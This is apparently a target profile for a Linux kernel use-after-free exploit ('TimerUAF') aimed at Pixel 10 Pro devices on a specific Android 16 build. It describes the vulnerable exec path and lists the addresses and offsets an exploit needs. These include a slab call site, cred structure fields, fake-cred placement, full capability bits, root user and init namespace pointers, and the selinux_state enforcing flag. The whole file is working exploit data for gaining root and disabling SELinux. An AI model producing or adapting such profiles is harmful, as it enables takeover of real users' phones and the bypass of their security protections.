# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Google Pixel 10 Pro / 10 Pro XL (blazer / mustang)
# Build : CP4A.261105.040.A1 (Android 16 QPR2, November 2026 security update)
# Kernel: 6.12.81-android16-6-g4a1a020d156e-ab16388316 (16K pages)
#
# The factory image carries two kernel payloads: `boot.img` (4K) and the
# standalone `kernel_16k` member.  The 16K payload has no -4k suffix in its
# release string, so it is selected by page size (the app and the binary both
# compare page_size before running).  Constants are from that payload:
#   kernel_16k (LZ4 in) sha256 c57d40d38c258430290c0c428e82aa822adb4c7d25a32514dbe81899faf0ae09
#   Image (raw)         sha256 efa65cbf3472a3cfdd57a8d666c76b9f9fa368898e7214d2365f5e619c7c7f50
#   timer_site          do_timer_create: bl kmem_cache_alloc_noprof at
#                       +0xa8, returns to +0xac (x0 = posix_timers_cache);
#                       the second bl at +0x588 is the alloc-tag path.
#   copy_process_low21  dup_task_struct is a standalone function here:
#                       kmem_cache_alloc_node_noprof returns to +0x54
#                       (x0 = task_struct_cachep); the +0x474 bl is the
#                       alloc-tag path.
#   selinux_state       kallsyms, struct base; BTF puts `enforcing` at bit 0
#                       and selinux_state-8 is avc_latest_notif_update.notif_lock
#   arch_task_struct_size = 5184 (BTF sizeof task_struct) + 784 from
#                       android_arch_task_struct_size=784 in vendor_boot's
#                       vendor command line, hence the 0x1750 object size
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers():
#   exec_task_namespaces -> posix_cpu_timers_exit -> exit_itimers
release = "6.12.81-android16-6-g4a1a020d156e-ab16388316"
schema_version = 1
ksu_kmi = "android16-6.12"

# Select this profile only on a 16K userspace.
page_size = 16384
page_shift = 14
slab_order = 0
slab_size = 16384
linear_min = 0xffff000000000000
linear_max = 0xffffc00000000000

# The 16K slab is order-0, so the reclaim is gated on a page_alloc event
# instead of the PCP/slabinfo path used by the 4K profile.
pcp_free = 0

# do_timer_create -> kmem_cache_alloc_noprof(posix_timers_cache) call site.
#   ffffc000801f86d0: bl kmem_cache_alloc_noprof
#   return address = ffffc000801f86d4
timer_site = 0xffffc000801f86d4
timer_alloc = 0x100

# cred_jar: sizeof(struct cred)=0xb8, slab object=0xc0 (same 6.12 layout).
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffc000828d99b8
panic_on_warn = 0xffffc00082610de0

# task_struct / cred layout (BTF)
task_cred_off = 0x900
copy_process_low21 = 0xdfb48
task_alloc_bytes = 0x1750

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffc0008263b348
init_user_ns = 0xffffc0008263b0d0
init_ucounts = 0xffffc0008263cce0
init_groups = 0xffffc0008263c810

# task_security_struct: landlock[0x0..0x8) then selinux[0x8..).
selinux_blob_off = 0x8
selinux_sid_kernel = 1
